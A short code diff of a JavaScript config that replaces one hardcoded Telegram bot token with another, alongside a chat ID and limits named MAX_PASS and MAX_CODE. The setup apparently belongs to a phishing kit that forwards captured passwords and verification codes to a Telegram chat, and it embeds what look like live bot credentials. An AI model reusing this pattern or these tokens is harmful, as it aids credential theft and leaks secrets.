@@ -1,5 +1,5 @@
 const config = {
-    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8962143082:AAHXmu4aK7YObfVMct64HZbcwJrvDUZY3k4',
+    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8990076396:AAFvsoyqatQ-gNjmXynjSLcsu9H86b4sQYw',
     chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004457804183',
     MAX_PASS: 2,
     MAX_CODE: 4,
